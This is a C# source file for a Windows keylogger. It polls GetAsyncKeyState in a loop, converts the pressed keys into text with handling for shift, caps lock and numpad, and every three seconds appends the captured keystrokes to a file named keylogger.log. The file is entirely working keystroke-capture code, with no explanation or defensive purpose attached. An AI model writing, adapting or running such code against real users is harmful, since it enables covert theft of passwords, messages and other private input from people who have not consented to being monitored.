using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Timers;
using System.Windows.Forms;

namespace SP5
{
    static class Program
    {
        
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        public static string buffer;
        [STAThread]
        static void Main(String[] args)
        {
            TimerCallback timer = new TimerCallback(WriteToFile);
            System.Threading.Timer timer1 = new System.Threading.Timer(timer, 0, 0, 3000);
            while(true)
            {                
                Thread.Sleep(500);
                for (int i = 0; i < 255; i++)
                {
                    bool state = GetAsyncKeyState(i) != 0;
                    bool shift = false;
                    short shiftState = (short)GetAsyncKeyState(16);
                    
                    if ((shiftState & 0x8000) == 0x8000)
                    {
                        shift = true;
                    }
                    bool caps = Console.CapsLock;
                    bool big = shift ^ caps;
                    bool numpad = GetAsyncKeyState(144) != 0;
                    if (state)
                    {
                        if (i == 13) buffer += "\r\n";
                        else if (i == 32) buffer += ' ';
                        else if (i < 41 && i > 34) buffer += ((Keys)i).ToString();
                        else if (i == 45) buffer += ((Keys)i).ToString();
                        else if (numpad && (i > 95 && i < 106)) buffer += (i - 96).ToString();
                        else if (i > 57 && i < 91)
                        {
                            if (big) buffer += ((Keys)i).ToString();
                            else buffer += ((Keys)i).ToString().ToLower();
                        }
                        else if(i > 47 && i < 58)
                        {
                            if (shift)
                            {
                                if (i == 48) buffer += ')';
                                else if (i == 49) buffer += '!';
                                else if (i == 50) buffer += '@';
                                else if (i == 51) buffer += '#';
                                else if (i == 52) buffer += '$';
                                else if (i == 53) buffer += '%';
                                else if (i == 54) buffer += '^';
                                else if (i == 55) buffer += '&';
                                else if (i == 56) buffer += '*';
                                else if (i == 57) buffer += '(';
                            }
                            else buffer += i - 48;
                        }
                    }
                }
            }
        }
        public static void WriteToFile(object obj)
        {
            File.AppendAllText("keylogger.log", buffer);
            buffer = "";
        }
    }
}
